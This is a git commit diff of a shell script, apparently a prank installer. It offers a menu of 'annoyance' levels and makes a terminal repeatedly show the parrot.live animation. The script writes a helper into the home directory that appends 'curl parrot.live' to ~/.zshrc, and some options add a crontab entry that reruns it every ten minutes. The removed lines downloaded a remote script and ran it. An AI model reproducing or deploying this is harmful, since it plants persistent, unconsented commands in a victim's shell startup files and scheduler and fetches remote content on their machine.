97b7629a3b243fc91de6ca8f654b6197e1e8173c
Kas <kasderooij@gmail.com>
2021-11-17 07:55:00 +0100

    update

--- setup.sh
+++ setup.sh
@@ -1,46 +1,93 @@
-curl -s https://kasderooi.github.io/curltest/doit.sh --output ~/.doit.sh
-chmod 555 ~/.doit.sh
+function hideyoparrot {
+	ESC=$( printf "\033")
+    cursor_blink_on()  { printf "$ESC[?25h"; }
+    cursor_blink_off() { printf "$ESC[?25l"; }
+    cursor_to()        { printf "$ESC[$1;${2:-1}H"; }
+    print_option()     { printf "   $1 "; }
+    print_selected()   { printf "  $ESC[7m $1 $ESC[27m"; }
+    get_cursor_row()   { IFS=';' read -sdR -p $'\E[6n' ROW COL; echo ${ROW#*[}; }
+    key_input()        { read -s -n3 key 2>/dev/null >&2
+                         if [[ $key = $ESC[A ]]; then echo up;    fi
+                         if [[ $key = $ESC[B ]]; then echo down;  fi
+                         if [[ $key = ""     ]]; then echo enter; fi; }
+	
+	for opt; do printf "\n"; done
 
-echo "Choose your level of annoyance from 1 to 4
-1. normal parrot
-2. recurring parrot
-3. fixed parrot
-4. recurring fixed parrot
-0. cancel and exit"
+	local current=`get_cursor_row`
+    local start=$(($current - $#))
 
+	trap "cursor_blink_on; stty echo; printf '\n'; exit" 2
+    cursor_blink_off
+
+    local selected=0
+    while true; do
+        local idx=0
+        for opt; do
+            cursor_to $(($start + $idx))
+            if [ $idx -eq $selected ]; then
+                print_selected "$opt"
+            else
+                print_option "$opt"
+            fi
+            ((idx++))
+        done
+        case `key_input` in
+            enter) break;;
+            up)    ((selected--));
+                   if [ $selected -lt 0 ]; then selected=$(($# - 1)); fi;;
+            down)  ((selected++));
+                   if [ $selected -ge $# ]; then selected=0; fi;;
+        esac
+    done
+
+    cursor_to $current
+    printf "\n"
+    cursor_blink_on
+
+    return $selected
+}
+
+touch ~/.doit.sh
+chmod 755 ~/.doit.sh
+echo "echo \"curl parrot.live\" >> ~/.zshrc" > ~/.doit.sh
 sleep 1s
 
-while [ -z $level ]
-do	
-	read level < /dev/tty
-done
+echo "Choose your level of annoyance:"
+options=("normal parrot"
+	"recurring parrot"
+	"fixed parrot"
+	"recurring fixed parrot"
+	"cancel and exit")
 
-while true; do
-	case $level in
-		1)
-			bash ~/.doit.sh
-			break
-			;;
-		2)
-			bash ~/.doit.sh &&
-			(crontab -l 2>/dev/null; echo "*/10 * * * * ~/.doit.sh") | crontab -
-			break
-			;;
-		3)
-			echo "echo \"curl parrot.live &\" >> ~/.zshrc" > ~/.doit.sh &&
-			bash ~/.doit.sh
-			break
-			;;
-		4)
-			echo "echo \"curl parrot.live &\" >> ~/.zshrc" > ~/.doit.sh &&
-			bash ~/.doit.sh &&
-			(crontab -l 2>/dev/null; echo "*/10 * * * * ~/.doit.sh") | crontab -
-			break
-			;;
-		0)
-			break
-			;;
-		*)
-			echo "invalid input" >&2
-	esac
-done
+hideyoparrot "${options[@]}"
+choice=$?
+case $choice in 
+	0)
+		bash ~/.doit.sh
+		curl parrot.live
+		break
+		;;
+	1)
+		bash ~/.doit.sh &&
+		(crontab -l 2>/dev/null; echo "*/10 * * * * ~/.doit.sh") | crontab -
+		curl parrot.live
+		break
+		;;
+	2)
+		echo "echo \"curl parrot.live &\" >> ~/.zshrc" > ~/.doit.sh &&
+		bash ~/.doit.sh
+		curl parrot.live
+		break
+		;;
+	3)
+		echo "echo \"curl parrot.live &\" >> ~/.zshrc" > ~/.doit.sh &&
+		bash ~/.doit.sh &&
+		(crontab -l 2>/dev/null; echo "*/10 * * * * ~/.doit.sh") | crontab -
+		curl parrot.live
+		break
+		;;
+	4)
+		curl parrot.live
+		break
+		;;
+esac
